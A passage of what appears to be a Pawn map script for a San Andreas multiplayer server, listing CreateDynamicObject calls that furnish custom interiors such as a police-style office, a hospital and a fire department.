	CreateDynamicObject(2773,300.66802979,-1506.51232910,-45.61115265,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_airprt_bar) (10)
	CreateDynamicObject(2773,298.75299072,-1506.51000977,-45.61295319,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_airprt_bar) (11)
	CreateDynamicObject(12814,309.92465210,-1460.12158203,-34.53705215,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cuntyeland04) (2)
	CreateDynamicObject(8169,304.51583862,-1444.51806641,-32.52923965,107.00000000,90.00000000,180.00000000, .interiorid = 1); //object(vgs_guardhseflr) (1)
	CreateDynamicObject(8169,304.51293945,-1449.76049805,-32.52923965,106.99584961,90.00000000,179.99450684, .interiorid = 1); //object(vgs_guardhseflr) (3)
	CreateDynamicObject(8169,313.10473633,-1444.55773926,-32.52923965,106.99588013,90.00000000,0.00000000, .interiorid = 1); //object(vgs_guardhseflr) (4)
	CreateDynamicObject(8169,313.10540771,-1449.97326660,-32.52923965,106.99584961,90.00000000,0.00000000, .interiorid = 1); //object(vgs_guardhseflr) (5)
	CreateDynamicObject(8169,301.08428955,-1441.09985352,-32.52923965,106.99588013,90.00000000,270.00000000, .interiorid = 1); //object(vgs_guardhseflr) (7)
	CreateDynamicObject(8169,300.08203125,-1441.09960938,-32.52923965,106.99584961,90.00000000,270.00000000, .interiorid = 1); //object(vgs_guardhseflr) (8)
	CreateDynamicObject(8169,316.52737427,-1441.10034180,-32.52923965,106.99588013,90.00000000,270.00000000, .interiorid = 1); //object(vgs_guardhseflr) (9)
	CreateDynamicObject(8169,319.76895142,-1441.10217285,-32.52923965,106.99584961,90.00000000,270.00000000, .interiorid = 1); //object(vgs_guardhseflr) (10)
	CreateDynamicObject(8169,321.71502686,-1444.51538086,-32.52923965,106.99584961,90.00000000,179.99450684, .interiorid = 1); //object(vgs_guardhseflr) (11)
	CreateDynamicObject(8169,321.71609497,-1451.29589844,-32.52923965,106.99584961,90.00000000,179.99450684, .interiorid = 1); //object(vgs_guardhseflr) (12)
	CreateDynamicObject(8169,296.79656982,-1444.37243652,-32.52923965,106.99584961,90.00000000,0.00000000, .interiorid = 1); //object(vgs_guardhseflr) (13)
	CreateDynamicObject(8169,296.80148315,-1451.28527832,-32.52923965,106.99584961,90.00000000,0.00000000, .interiorid = 1); //object(vgs_guardhseflr) (14)
	CreateDynamicObject(14856,309.25753784,-1451.73974609,-32.65511322,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cellsa) (1)
	CreateDynamicObject(8169,314.25317383,-1444.62646484,-32.52923965,106.99588013,90.00000000,90.00000000, .interiorid = 1); //object(vgs_guardhseflr) (15)
	CreateDynamicObject(8169,304.31835938,-1444.62304688,-32.52923965,106.99584961,90.00000000,90.00000000, .interiorid = 1); //object(vgs_guardhseflr) (16)
	CreateDynamicObject(2957,308.80404663,-1453.56689453,-32.47067261,0.00000000,90.00000000,0.00000000, .interiorid = 1); //object(chinatgaragedoor) (1)
	CreateDynamicObject(2957,305.55273438,-1453.56542969,-30.41305542,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(chinatgaragedoor) (7)
	CreateDynamicObject(2957,311.57226562,-1453.56542969,-30.41333008,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(chinatgaragedoor) (8)
	CreateDynamicObject(1491,305.67440796,-1453.56250000,-34.52923965,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(gen_doorint01) (1)
	CreateDynamicObject(1491,310.42266846,-1453.56958008,-34.52923965,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(gen_doorint01) (2)
	CreateDynamicObject(2957,304.04525757,-1453.56958008,-32.47067261,0.00000000,90.00000000,0.00000000, .interiorid = 1); //object(chinatgaragedoor) (1)
	CreateDynamicObject(2957,313.55474854,-1453.56701660,-32.47067261,0.00000000,90.00000000,0.00000000, .interiorid = 1); //object(chinatgaragedoor) (1)
	CreateDynamicObject(1649,308.91375732,-1451.29418945,-32.86349869,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(wglasssmash) (1)
	CreateDynamicObject(1649,308.91308594,-1451.29394531,-32.86349869,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(wglasssmash) (2)
	CreateDynamicObject(8169,308.91879272,-1450.16955566,-32.52923965,106.99588013,90.00000000,180.00000000, .interiorid = 1); //object(vgs_guardhseflr) (8)
	CreateDynamicObject(1649,308.91668701,-1451.29418945,-29.60837173,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(wglasssmash) (3)
	CreateDynamicObject(1649,308.91128540,-1451.29431152,-29.60297012,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(wglasssmash) (4)
	CreateDynamicObject(14532,309.53399658,-1452.88830566,-33.54652023,0.00000000,0.00000000,315.00000000, .interiorid = 1); //object(tv_stand_driv) (1)
	CreateDynamicObject(1671,311.07064819,-1450.01330566,-34.06902695,0.00000000,0.00000000,311.60888672, .interiorid = 1); //object(swivelchair_a) (1)
	CreateDynamicObject(1671,311.91442871,-1451.20056152,-34.06902695,0.00000000,0.00000000,282.31018066, .interiorid = 1); //object(swivelchair_a) (2)
	CreateDynamicObject(1810,305.47702026,-1450.94470215,-34.52923965,0.00000000,0.00000000,87.65490723, .interiorid = 1); //object(cj_foldchair) (1)
	CreateDynamicObject(1810,307.89422607,-1451.39428711,-34.52923965,0.00000000,0.00000000,273.15954590, .interiorid = 1); //object(cj_foldchair) (2)
	CreateDynamicObject(1827,306.67138672,-1451.28918457,-34.52923965,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(man_sdr_tables) (2)
	CreateDynamicObject(2009,290.45791626,-1468.11608887,-34.52298355,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(officedesk2l) (1)
	CreateDynamicObject(2197,286.46551514,-1467.00256348,-34.52298355,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(filling_cabinet) (4)
	CreateDynamicObject(2200,292.76733398,-1469.83776855,-34.52298355,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(med_office5_unit_1) (1)
	CreateDynamicObject(2204,287.41705322,-1471.50622559,-34.52298355,0.00000000,0.00000000,180.00000000, .interiorid = 1); //object(med_office8_cabinet) (1)
	CreateDynamicObject(1714,290.53604126,-1467.20202637,-34.52298355,0.00000000,0.00000000,289.61608887, .interiorid = 1); //object(kb_swivelchair1) (1)
	CreateDynamicObject(1778,329.46221924,-1474.47827148,-34.52298355,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_mop_pail) (1)
	CreateDynamicObject(1771,328.46612549,-1476.94348145,-33.88931656,0.00000000,0.00000000,268.69885254, .interiorid = 1); //object(cj_bunk_bed1) (1)
	CreateDynamicObject(1337,322.30862427,-1474.60803223,-33.87375641,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(binnt07_la) (2)
	CreateDynamicObject(1338,326.28952026,-1476.88671875,-33.81167221,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(binnt08_la) (1)
	CreateDynamicObject(1440,324.06448364,-1476.95019531,-34.00386810,0.00000000,0.00000000,180.00000000, .interiorid = 1); //object(dyn_box_pile_3) (1)
	CreateDynamicObject(1265,325.22683716,-1476.19226074,-34.05393982,0.00000000,0.00000000,296.25524902, .interiorid = 1); //object(blackbag2) (1)
	CreateDynamicObject(1264,323.25726318,-1474.70031738,-34.05083847,0.00000000,0.00000000,279.02832031, .interiorid = 1); //object(blackbag1) (1)
	CreateDynamicObject(11631,329.22161865,-1468.77941895,-33.27708054,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(ranch_desk) (1)
	CreateDynamicObject(2607,325.18939209,-1468.12915039,-34.12730026,0.00000000,0.00000000,180.00000000, .interiorid = 1); //object(polce_desk2) (1)
	CreateDynamicObject(2356,328.48495483,-1469.47021484,-34.52298355,0.00000000,0.00000000,303.83496094, .interiorid = 1); //object(police_off_chair) (1)
	CreateDynamicObject(2207,303.88574219,-1480.73437500,-28.73089981,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(med_office7_desk_1) (1)
	CreateDynamicObject(1714,305.63839722,-1481.56811523,-28.75525284,0.00000000,0.00000000,286.04431152, .interiorid = 1); //object(kb_swivelchair1) (2)
	CreateDynamicObject(2190,303.95974731,-1482.46374512,-27.95352745,0.00000000,0.00000000,111.03887939, .interiorid = 1); //object(pc_1) (2)
	CreateDynamicObject(2311,304.88085938,-1489.10546875,-28.73089981,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_tv_table2) (2)
	CreateDynamicObject(2700,300.06005859,-1481.78222656,-25.16612434,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_sex_tv2) (1)
	CreateDynamicObject(1893,301.89276123,-1493.61791992,-31.40267563,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(shoplight1) (1)
	CreateDynamicObject(1893,301.88687134,-1486.12084961,-31.40267563,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(shoplight1) (2)
	CreateDynamicObject(1893,301.28695679,-1483.02026367,-31.40267563,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(shoplight1) (3)
	CreateDynamicObject(2007,285.47372437,-1461.86901855,-34.53079605,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(filing_cab_nu01) (1)
	CreateDynamicObject(2007,285.47827148,-1465.82226562,-34.53079605,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(filing_cab_nu01) (2)
	CreateDynamicObject(2008,289.19281006,-1463.93908691,-34.53079605,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(officedesk1) (1)
	CreateDynamicObject(1714,290.24304199,-1463.02392578,-34.52298355,0.00000000,0.00000000,289.61608887, .interiorid = 1); //object(kb_swivelchair1) (1)
	CreateDynamicObject(2608,292.67315674,-1465.32287598,-33.81932449,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(polce_shelf) (1)
	CreateDynamicObject(2609,292.52435303,-1461.60766602,-33.79908752,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_p_fileing1) (1)
	CreateDynamicObject(2191,292.37973022,-1462.93566895,-34.53079605,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(med_office2_cab) (1)
	CreateDynamicObject(16662,309.20010376,-1463.23413086,-24.77413940,63.39999390,90.00000000,270.00000000, .interiorid = 1); //object(a51_radar_stuff) (1)
	CreateDynamicObject(1668,304.25622559,-1480.90881348,-27.78682327,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(propvodkabotl1) (1)
	CreateDynamicObject(2855,303.82894897,-1481.18969727,-27.95352745,0.00000000,0.00000000,65.86511230, .interiorid = 1); //object(gb_bedmags05) (1)
	CreateDynamicObject(2852,303.61880493,-1482.01403809,-27.95352745,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(gb_bedmags02) (1)
	CreateDynamicObject(1736,307.49340820,-1481.78393555,-25.27207184,0.00000000,0.00000000,269.48693848, .interiorid = 1); //object(cj_stags_head) (1)
	CreateDynamicObject(2491,308.43945312,-1467.54589844,-35.16662979,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(model_stand) (1)
	CreateDynamicObject(1730,300.42053223,-1474.60668945,-28.73089981,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(swank_cabinet_3) (1)
	CreateDynamicObject(2204,301.84945679,-1474.26086426,-28.73089981,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(med_office8_cabinet) (2)
	CreateDynamicObject(2200,302.21353149,-1474.26831055,-26.94274521,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(med_office5_unit_1) (2)
	CreateDynamicObject(1703,304.62121582,-1474.67419434,-28.73089981,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(kb_couch02) (3)
	CreateDynamicObject(12814,313.29492188,-1478.75097656,-24.23483658,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(cuntyeland04) (1)
	CreateDynamicObject(2002,302.75833130,-1489.31335449,-28.73089981,0.00000000,0.00000000,180.00000000, .interiorid = 1); //object(water_coolnu) (1)
	CreateDynamicObject(2288,300.29425049,-1479.18029785,-26.33251381,0.00000000,0.00000000,90.09881592, .interiorid = 1); //object(frame_3) (1)
	CreateDynamicObject(2007,314.12896729,-1505.99865723,-46.13018036,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(filing_cab_nu01) (3)
	CreateDynamicObject(1806,312.65527344,-1512.03027344,-46.12367630,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(med_office_chair) (1)
	CreateDynamicObject(1806,312.62911987,-1518.00183105,-46.12367630,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(med_office_chair) (1)
	CreateDynamicObject(1806,312.64999390,-1499.31555176,-46.12367630,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(med_office_chair) (1)
	CreateDynamicObject(1806,312.67895508,-1493.98632812,-46.12367630,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(med_office_chair) (1)
	CreateDynamicObject(2190,310.62237549,-1512.26940918,-45.21636200,0.00000000,0.00000000,104.99630737, .interiorid = 1); //object(pc_1) (1)
	CreateDynamicObject(2190,310.59692383,-1518.19750977,-45.21636200,0.00000000,0.00000000,104.99630737, .interiorid = 1); //object(pc_1) (1)
	CreateDynamicObject(2190,310.74307251,-1499.55859375,-45.21636200,0.00000000,0.00000000,104.99630737, .interiorid = 1); //object(pc_1) (1)
	CreateDynamicObject(2190,310.70114136,-1494.10925293,-45.21636200,0.00000000,0.00000000,104.99633789, .interiorid = 1); //object(pc_1) (1)
	CreateDynamicObject(1886,308.70672607,-1467.93701172,-30.56187057,16.16790771,0.19573975,179.06506348, .interiorid = 1); //object(shop_sec_cam) (1)
	CreateDynamicObject(2747,308.48376465,-1472.51135254,-34.11668777,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_donut_table) (1)
	CreateDynamicObject(2747,310.08023071,-1472.51135254,-34.11668777,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_donut_table) (2)
	CreateDynamicObject(2747,306.88693237,-1472.51135254,-34.11668777,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_donut_table) (3)
	CreateDynamicObject(2747,306.88693237,-1473.50244141,-34.11668777,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_donut_table) (4)
	CreateDynamicObject(2747,308.48376465,-1473.50244141,-34.11668777,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_donut_table) (5)
	CreateDynamicObject(2747,310.08023071,-1473.50244141,-34.11668777,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_donut_table) (6)
	CreateDynamicObject(1806,306.94726562,-1474.57141113,-34.52923965,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(med_office_chair) (6)
	CreateDynamicObject(1806,308.53701782,-1474.58837891,-34.52923965,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(med_office_chair) (7)
	CreateDynamicObject(1806,310.08981323,-1474.62011719,-34.52923965,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(med_office_chair) (8)
	CreateDynamicObject(1806,310.13595581,-1471.40625000,-34.52923965,0.00000000,0.00000000,180.00000000, .interiorid = 1); //object(med_office_chair) (9)
	CreateDynamicObject(1806,308.49731445,-1471.39831543,-34.52923965,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(med_office_chair) (10)
	CreateDynamicObject(1806,306.94650269,-1471.37988281,-34.52923965,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(med_office_chair) (11)
	CreateDynamicObject(1806,305.62155151,-1473.00012207,-34.52923965,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(med_office_chair) (12)
	CreateDynamicObject(1806,311.44116211,-1472.99316406,-34.52923965,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(med_office_chair) (13)
	CreateDynamicObject(16782,322.13433838,-1469.29296875,-32.56002808,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(a51_radar_scan) (1)
	CreateDynamicObject(2611,325.91857910,-1473.77783203,-32.58835220,0.00000000,0.00000000,179.93066406, .interiorid = 1); //object(police_nb1) (1)
	CreateDynamicObject(14527,304.30047607,-1480.94714355,-26.86861801,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(fannyfan) (1)
	CreateDynamicObject(2198,289.17578125,-1474.82629395,-34.53079605,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(med_office2_desk_3) (1)
	CreateDynamicObject(1714,290.23767090,-1474.06457520,-34.53079605,0.00000000,0.00000000,300.22509766, .interiorid = 1); //object(kb_swivelchair1) (4)
	CreateDynamicObject(2182,292.43322754,-1475.33679199,-34.53079605,0.00000000,0.00000000,180.00000000, .interiorid = 1); //object(med_office5_desk_1) (1)
	CreateDynamicObject(2000,285.47576904,-1472.12133789,-34.53079605,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(filing_cab_nu) (1)
	CreateDynamicObject(2000,285.47576904,-1472.64123535,-34.53079605,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(filing_cab_nu) (2)
	CreateDynamicObject(14632,321.33325195,-1475.83569336,-33.03472900,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(paperchase_bits2b) (1)
	CreateDynamicObject(2186,329.36141968,-1464.33728027,-34.52298355,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(photocopier_1) (1)
	CreateDynamicObject(2206,329.35076904,-1471.45605469,-34.52298355,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(med_office8_desk_02) (1)
	CreateDynamicObject(2606,329.50375366,-1472.36730957,-33.36120224,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_police_counter2) (1)
	CreateDynamicObject(2612,304.02514648,-1463.07299805,-32.50022888,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(police_nb2) (1)
	CreateDynamicObject(2611,314.25363159,-1463.07299805,-32.39287949,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(police_nb1) (2)
	CreateDynamicObject(1722,323.52783203,-1485.03967285,-34.52298355,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(off_chairnu) (1)
	CreateDynamicObject(1722,322.35116577,-1485.02929688,-34.52298355,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(off_chairnu) (2)
	CreateDynamicObject(1722,321.10070801,-1485.05798340,-34.52298355,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(off_chairnu) (3)
	CreateDynamicObject(1722,325.25961304,-1481.93444824,-34.52298355,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(off_chairnu) (4)
	CreateDynamicObject(1722,325.27322388,-1480.63781738,-34.52298355,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(off_chairnu) (5)
	CreateDynamicObject(1722,325.24453735,-1479.48413086,-34.52298355,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(off_chairnu) (6)
	CreateDynamicObject(1808,317.90686035,-1482.45349121,-34.52298355,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_watercooler2) (1)
	CreateDynamicObject(15038,325.23391724,-1478.51025391,-33.90579605,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(plant_pot_3_sv) (1)
	CreateDynamicObject(1616,317.07241821,-1498.25427246,-37.11650085,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(nt_securecam1_01) (1)
	CreateDynamicObject(1616,281.14285278,-1481.05761719,-31.00306702,0.00000000,0.00000000,267.23352051, .interiorid = 1); //object(nt_securecam1_01) (2)
	CreateDynamicObject(1616,318.01690674,-1485.05334473,-31.00306702,0.00000000,0.00000000,267.23144531, .interiorid = 1); //object(nt_securecam1_01) (3)
	CreateDynamicObject(1616,277.92636108,-1509.63354492,-43.22993469,0.00000000,0.00000000,267.23144531, .interiorid = 1); //object(nt_securecam1_01) (4)

	// Hospital Interior
	CreateDynamicObject(18030, 1174.7900390625, -1343.57421875, 2424.4133300781, 0, 0, 0, .interiorid = 1);
	CreateDynamicObject(14466, 1214.5484619141, -1360.7130126953, 2432.2053222656, 0, 0, 270.5, .interiorid = 1);
	CreateDynamicObject(7191, 1191.828125, -1351.0107421875, 2421.6208496094, 0, 270, 0, .interiorid = 1);
	CreateDynamicObject(14782, 1187.7976074219, -1353.7375488281, 2423.0622558594, 0, 0, 90.5, .interiorid = 1);
	CreateDynamicObject(1523, 1190.55078125, -1350.01953125, 2422.2648925781, 0, 0, 180.24719238281, .interiorid = 1);
	CreateDynamicObject(18070, 1169.6414794922, -1345.1927490234, 2422.5458984375, 0, 0, 0, .interiorid = 1);
	CreateDynamicObject(4724, 1158.5886230469, -1353.6053466797, 2423.7512207031, 0, 0, 0.25, .interiorid = 1);
	CreateDynamicObject(2001, 1163.2530517578, -1355.927734375, 2422.0461425781, 0, 0, 0, .interiorid = 1);
	CreateDynamicObject(932, 1185.4672851563, -1355.8714599609, 2422.0461425781, 0, 0, 272.5, .interiorid = 1);
	CreateDynamicObject(932, 1183.7150878906, -1355.9479980469, 2422.0461425781, 0, 0, 272.49938964844, .interiorid = 1);
	CreateDynamicObject(932, 1182.11328125, -1355.9810791016, 2422.0461425781, 0, 0, 272.49938964844, .interiorid = 1);
	CreateDynamicObject(932, 1180.4866943359, -1355.9487304688, 2422.0461425781, 0, 0, 272.49938964844, .interiorid = 1);
	CreateDynamicObject(1557, 1168.1516113281, -1357.0413818359, 2422.0461425781, 0, 0, 359.5, .interiorid = 1);
	CreateDynamicObject(1557, 1171.1590576172, -1357.0489501953, 2422.0461425781, 0, 0, 180, .interiorid = 1);
	CreateDynamicObject(2596, 1156.7939453125, -1348.4765625, 2425.3452148438, 0, 0, 0, .interiorid = 1);
	CreateDynamicObject(2596, 1163.4686279297, -1354.6719970703, 2425.3083496094, 0, 0, 270.25, .interiorid = 1);
	CreateDynamicObject(2773, 1185.4097900391, -1354.6234130859, 2422.5634765625, 0, 0, 90.25, .interiorid = 1);
	CreateDynamicObject(2773, 1183.4921875, -1354.6352539063, 2422.5634765625, 0, 0, 90.247192382813, .interiorid = 1);
	CreateDynamicObject(2773, 1181.576171875, -1354.6499023438, 2422.5634765625, 0, 0, 90.247192382813, .interiorid = 1);
	CreateDynamicObject(2190, 1168.4984130859, -1346.9685058594, 2423.0561523438, 0, 0.25, 182.75, .interiorid = 1);
	CreateDynamicObject(2190, 1170.7844238281, -1346.9844970703, 2423.0561523438, 0, 0.2471923828125, 182.74658203125, .interiorid = 1);
	CreateDynamicObject(1663, 1170.712890625, -1345.3366699219, 2422.5063476563, 0, 0, 17.25, .interiorid = 1);
	CreateDynamicObject(1663, 1168.3572998047, -1345.3454589844, 2422.5063476563, 0, 0, 355.99853515625, .interiorid = 1);
	CreateDynamicObject(2894, 1169.7390136719, -1347.2918701172, 2423.0561523438, 0, 0, 0, .interiorid = 1);
	CreateDynamicObject(7930, 1189.5693359375, -1345.9460449219, 2423.5441894531, 90, 180.0054931640600549316406, 269.98352050781, .interiorid = 1);
	CreateDynamicObject(3962, 1156.3192138672, -1357.0517578125, 2424.2602539063, 0, 0, 268.5, .interiorid = 1);
	CreateDynamicObject(2257, 1152.9465332031, -1351.5755615234, 2424.3505859375, 0, 180, 89.999969482422, .interiorid = 1);
	CreateDynamicObject(2243, 1166.4963378906, -1348.0822753906, 2422.3195800781, 0, 0, 0, .interiorid = 1);
	CreateDynamicObject(2243, 1172.7916259766, -1347.9880371094, 2422.3195800781, 0, 0, 0, .interiorid = 1);
	CreateDynamicObject(2954, 1190.2352294922, -1346.0294189453, 2422.0461425781, 0, 0, 270.5, .interiorid = 1);
	CreateDynamicObject(1726, 1155.638671875, -1348.72265625, 2422.0461425781, 0, 0, 0.25, .interiorid = 1);
	CreateDynamicObject(1726, 1153.4948730469, -1352.5561523438, 2422.0461425781, 0, 0, 89.997192382813, .interiorid = 1);
	CreateDynamicObject(1726, 1157.3165283203, -1355.7957763672, 2422.0461425781, 0, 0, 179.99450683594, .interiorid = 1);
	CreateDynamicObject(1727, 1154.0897216797, -1354.7977294922, 2422.0461425781, 0, 0, 123, .interiorid = 1);
	CreateDynamicObject(1727, 1153.9633789063, -1349.6390380859, 2422.0461425781, 0, 0, 44.997436523438, .interiorid = 1);
	CreateDynamicObject(1727, 1162.5498046875, -1354.5593261719, 2422.0461425781, 0, 0, 220.99743652344, .interiorid = 1);
	CreateDynamicObject(7191, 1157.6741943359, -1339.1177978516, 2424.0207519531, 0, 0, 270, .interiorid = 1);
	CreateDynamicObject(7191, 1157.6701660156, -1338.3753662109, 2424.0207519531, 0, 0, 270, .interiorid = 1);
	CreateDynamicObject(1776, 1153.2979736328, -1343.3521728516, 2423.1455078125, 0, 0, 90.75, .interiorid = 1);
	CreateDynamicObject(1209, 1153.2958984375, -1346.2855224609, 2422.0461425781, 0, 0, 90.5, .interiorid = 1);
	CreateDynamicObject(7191, 1167.7000732422, -1313.4320068359, 2427.9807128906, 0, 0, 180, .interiorid = 1);
	CreateDynamicObject(7191, 1191.1739501953, -1335.5490722656, 2424.0207519531, 0, 0, 90, .interiorid = 1);
	CreateDynamicObject(7191, 1167.69921875, -1313.431640625, 2424.0207519531, 0, 0, 179.99450683594, .interiorid = 1);
	CreateDynamicObject(7191, 1191.173828125, -1335.548828125, 2427.9807128906, 0, 0, 90, .interiorid = 1);
	CreateDynamicObject(2603, 1154.3084716797, -1331.0260009766, 2422.4995117188, 0, 0, 0, .interiorid = 1);
	CreateDynamicObject(2603, 1157.8651123047, -1331.033203125, 2422.4995117188, 0, 0, 0, .interiorid = 1);
	CreateDynamicObject(2603, 1162.1901855469, -1330.9475097656, 2422.4995117188, 0, 0, 0, .interiorid = 1);
	CreateDynamicObject(2603, 1165.8120117188, -1330.8693847656, 2422.4995117188, 0, 0, 0, .interiorid = 1);
	CreateDynamicObject(2596, 1156.2908935547, -1337.9664306641, 2424.7763671875, 0, 0, 179.25, .interiorid = 1);
	CreateDynamicObject(2596, 1163.3677978516, -1337.9395751953, 2424.7763671875, 0, 0, 179.24743652344, .interiorid = 1);
	CreateDynamicObject(3383, 1175.9519042969, -1330.5677490234, 2422.0461425781, 0, 0, 179.75, .interiorid = 1);
	CreateDynamicObject(3383, 1183.3975830078, -1330.3992919922, 2422.0461425781, 0, 0, 179.74731445313, .interiorid = 1);
	CreateDynamicObject(3388, 1172.5631103516, -1329.8569335938, 2422.0461425781, 0, 0, 90.25, .interiorid = 1);
	CreateDynamicObject(3388, 1180.3153076172, -1329.8544921875, 2422.0461425781, 0, 0, 90.247192382813, .interiorid = 1);
	CreateDynamicObject(3394, 1184.6655273438, -1334.9022216797, 2422.0461425781, 0, 0, 269.75, .interiorid = 1);
	CreateDynamicObject(3394, 1175.7877197266, -1334.8275146484, 2422.0461425781, 0, 0, 269.74731445313, .interiorid = 1);

	// Fire Department
	CreateDynamicObject(14853, 233.17, 151.00, 2002.00,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(14855, 199.40, 146.71, 2000.94,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(8133, 222.43, 152.07, 2022.76,   90.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(14858, 213.01, 151.55, 2002.00,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(8133, 172.93, 150.34, 1997.00,   0.00, 90.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2206, 189.63, 132.41, 1996.78,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(2206, 184.74, 132.63, 1996.84,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(2737, 189.22, 135.20, 1999.00,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(1663, 188.62, 130.16, 1997.31,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(1663, 189.68, 130.87, 1997.31,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(1663, 187.74, 130.89, 1997.31,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(1663, 184.92, 131.06, 1997.31,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(1663, 183.72, 130.35, 1997.31,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(1663, 182.57, 131.09, 1997.31,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(1671, 188.75, 133.92, 1997.30,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(1671, 183.78, 133.49, 1997.30,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(16378, 178.77, 133.37, 1997.58,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(1721, 178.29, 132.04, 1997.00,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(1721, 176.43, 132.10, 1997.00,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2161, 175.98, 128.29, 1996.90,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(2161, 175.98, 129.59, 1996.90,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(2163, 181.20, 127.73, 1996.88,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(2163, 181.20, 127.73, 1997.78,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(14455, 191.37, 128.10, 1998.53,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(2002, 186.88, 135.02, 1997.00,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2002, 181.72, 134.96, 1997.00,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(644, 190.81, 134.36, 1997.00,   0.00, 0.00, 104.00, .interiorid = 73);
